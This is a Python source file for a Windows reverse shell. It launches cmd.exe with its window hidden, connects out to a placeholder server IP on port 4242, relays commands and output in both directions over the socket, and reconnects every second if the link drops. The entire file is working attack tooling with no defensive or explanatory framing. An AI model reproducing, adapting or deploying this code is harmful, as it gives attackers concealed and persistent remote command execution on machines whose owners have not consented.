import socket
import os
import threading
import subprocess as sp
import time


def read_output(p, s):
    while True:
        try:
            o = os.read(p.stdout.fileno(), 1024)
            if not o:
                break
            s.send(o)
        except (socket.error, ConnectionResetError, ConnectionAbortedError, OSError):
            break


def recv_input(p, s):
    while True:
        try:
            i = s.recv(1024)
            if not i:
                break
            os.write(p.stdin.fileno(), i)
        except (socket.error, ConnectionResetError, ConnectionAbortedError, OSError):
            break


def create_hidden_startupinfo():
    startupinfo = sp.STARTUPINFO()
    startupinfo.dwFlags |= sp.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = os.environ.get("SW_HIDE", 0)
    return startupinfo


def manage_connection(target_ip, target_port):
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT, startupinfo=create_hidden_startupinfo())

    while True:
        s = socket.socket()
        try:
            s.connect((target_ip, target_port))

            t1 = threading.Thread(target=read_output, args=(p, s), daemon=True)
            t1.start()

            t2 = threading.Thread(target=recv_input, args=(p, s))
            t2.start()
            t2.join()  # Wait for the recv_input thread to finish

        except (socket.error, ConnectionResetError, ConnectionAbortedError, OSError, ):
            s.close()  # Close the socket before attempting to reconnect
            time.sleep(1)  # Wait for 1 seconds before trying to reconnect
        finally:
            s.close()  # Ensure the socket is closed before the next iteration


def main():
    target_ip = 'SERVER_IP'  # Replace 'SERVER_IP' with the IP address of your server
    target_port = 4242

    manage_connection(target_ip, target_port)


if __name__ == '__main__':
    main()
